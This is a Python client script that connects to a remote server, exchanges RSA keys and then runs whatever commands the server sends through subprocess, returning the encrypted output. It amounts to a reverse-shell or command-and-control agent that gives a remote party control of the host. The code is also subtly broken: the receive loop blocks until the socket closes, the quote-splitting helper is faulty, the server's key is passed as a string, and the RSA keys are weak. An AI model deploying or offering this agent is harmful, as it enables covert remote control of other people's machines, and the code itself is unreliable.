import sys
import socket
import rsa
import subprocess

BUFFER_SIZE = 4096

def authenticate_server(client_socket, public_key):

    send_resp(client_socket, str(public_key).encode())

    encrypt_key = recv_msg(client_socket).decode()

    return encrypt_key

def encrypt(msg, key):
    encrypted_message = rsa.encrypt(msg.encode(), key)
    return encrypted_message

def decrypt(msg, key):
    decrypted_message = rsa.decrypt(msg, key).decode()
    return decrypted_message


def send_resp(client_socket, msg):
    client_socket.sendall(msg)

def recv_msg(client_socket):
    response = b''
    while True:
        data = client_socket.recv(BUFFER_SIZE)
        if not data:
            break
        response += data

    return response

def execute_command(command):
    command_arr = split_ignore_quotes(command, ' ')
    command_resp = subprocess.check_output(command_arr)
    return command_resp

def split_ignore_quotes(string, sep):
    if string.find('"') == -1:
        return string
    else:
        split_str = string.split('"')
        complete_split = []
        i = 1
        for substr in split_str:
            if i%2 == 1:
                complete_split += substr.split(' ')
            else:
                complete_split += '\"' + substr + '\"'
    return complete_split


def client_program():
    if(len(sys.argv) != 3):
        print("Usage: python client.py <server IP address> <server port number>")
        sys.exit()

    port = int(sys.argv[2])
    server_ip = socket.gethostbyname(sys.argv[1])

    server_addr = (server_ip, port)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(server_addr)

    public_key, private_key = rsa.newkeys(512)

    encrypt_key = authenticate_server(client_socket, public_key)

    while True:
        encrypted_command = recv_msg(client_socket)
        decrypted_command = decrypt(encrypted_command, private_key)
        if decrypted_command == 'exit':
            break

        response = execute_command(decrypted_command)
        encrypted_response = encrypt(response, encrypt_key)
        send_resp(client_socket, encrypted_response)
        
    client_socket.close()

if __name__ == '__main__':
    client_program()